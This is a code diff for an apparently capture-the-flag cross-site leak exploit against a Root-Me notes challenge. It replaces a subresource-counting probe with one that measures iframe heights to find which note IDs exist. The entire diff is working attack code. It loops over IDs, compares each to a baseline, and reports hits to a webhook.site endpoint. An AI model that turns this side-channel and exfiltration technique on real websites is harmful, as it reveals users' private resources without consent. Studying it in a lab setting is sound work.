@@ -1,19 +1,20 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Subresource XS-Leak Scanner</title>
+    <title>Height XS-Leak Scanner</title>
 </head>
 <body>
-    <h1>Scanning for notes...</h1>
+    <h1>Scanning notes...</h1>
     <div id="status"></div>
     <script>
         const TARGET_BASE = 'https://web-client-ch56.challenge01.root-me.org:58056/notes/';
         const WEBHOOK = 'https://webhook.site/04ff6bdb-7cda-4c12-b9a3-be41cf998864';
         const START_ID = 1378;
         const END_ID = 2000;
-        const DELAY_MS = 500;                // delay between IDs
-        const BASELINE_ID = -1;               // non-existent ID
-        const IFRAME_TIMEOUT = 2000;          // max wait for iframe to load
+        const DELAY_MS = 500;               // delay between IDs
+        const BASELINE_ID = -1;              // non-existent ID
+        const IFRAME_TIMEOUT = 2000;         // max wait for iframe to load
+        const HEIGHT_THRESHOLD = 20;         // extra pixels above baseline to consider a hit
 
         function updateStatus(msg) {
             const div = document.getElementById('status');
@@ -21,39 +22,28 @@
             console.log(msg);
         }
 
-        // Count subresources loaded from the same origin as the target
-        function countSubresources(origin, afterTimestamp) {
-            const entries = performance.getEntriesByType('resource');
-            let count = 0;
-            for (const entry of entries) {
-                if (entry.startTime > afterTimestamp && entry.name.startsWith(origin)) {
-                    count++;
-                }
-            }
-            return count;
-        }
-
-        // Measure subresource count for a given ID
-        async function measureSubresources(id) {
+        // Load an ID in an iframe and return its rendered height
+        async function measureHeight(id) {
             return new Promise((resolve) => {
                 const url = TARGET_BASE + id;
-                const origin = new URL(url).origin;
                 const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
+                // Position off-screen so it doesn't interfere
+                iframe.style.position = 'absolute';
+                iframe.style.top = '-9999px';
+                iframe.style.left = '-9999px';
+                iframe.style.width = '100%';
+                iframe.style.height = 'auto';
+                iframe.style.display = 'block';
                 iframe.src = url;
 
-                // Mark before load
-                const beforeTime = performance.now();
                 let resolved = false;
-
                 const timeout = setTimeout(() => {
                     if (!resolved) {
                         resolved = true;
+                        const height = iframe.offsetHeight;
+                        updateStatus(`ID ${id} (timeout): height = ${height}px`);
                         document.body.removeChild(iframe);
-                        // Count subresources after timeout (maybe still loading)
-                        const count = countSubresources(origin, beforeTime);
-                        updateStatus(`ID ${id} (timeout): subresource count = ${count}`);
-                        resolve(count);
+                        resolve(height);
                     }
                 }, IFRAME_TIMEOUT);
 
@@ -61,33 +51,30 @@
                     clearTimeout(timeout);
                     if (resolved) return;
                     resolved = true;
-                    // Wait a bit for any subresources to start loading
+                    // Allow layout to settle before reading height
                     setTimeout(() => {
-                        const count = countSubresources(origin, beforeTime);
-                        updateStatus(`ID ${id}: subresource count = ${count}`);
+                        const height = iframe.offsetHeight;
+                        updateStatus(`ID ${id}: height = ${height}px`);
                         document.body.removeChild(iframe);
-                        resolve(count);
-                    }, 200);
+                        resolve(height);
+                    }, 100);
                 };
                 document.body.appendChild(iframe);
             });
         }
 
-        // Measure baseline (non-existent ID)
+        // Measure baseline height using a non-existent ID
         async function getBaseline() {
             updateStatus(`Measuring baseline using ID ${BASELINE_ID}...`);
-            // Clear existing performance entries
-            performance.clearResourceTimings();
-            const baselineCount = await measureSubresources(BASELINE_ID);
-            updateStatus(`Baseline subresource count = ${baselineCount}`);
-            return baselineCount;
+            const height = await measureHeight(BASELINE_ID);
+            updateStatus(`Baseline height = ${height}px`);
+            return height;
         }
 
-        async function checkId(id, baselineCount) {
-            performance.clearResourceTimings();
-            const subCount = await measureSubresources(id);
-            // If subresource count is higher than baseline, it's a positive
-            return subCount > baselineCount;
+        // Check if the given ID is likely a valid note
+        async function checkId(id, baselineHeight) {
+            const height = await measureHeight(id);
+            return height > baselineHeight + HEIGHT_THRESHOLD;
         }
 
         function reportId(id) {
@@ -103,7 +90,7 @@
                 const exists = await checkId(id, baseline);
                 if (exists) {
                     reportId(id);
-                    break; // remove if you want to continue scanning
+                    break;                // stop after first hit, remove to continue scanning
                 }
                 await new Promise(r => setTimeout(r, DELAY_MS));
             }
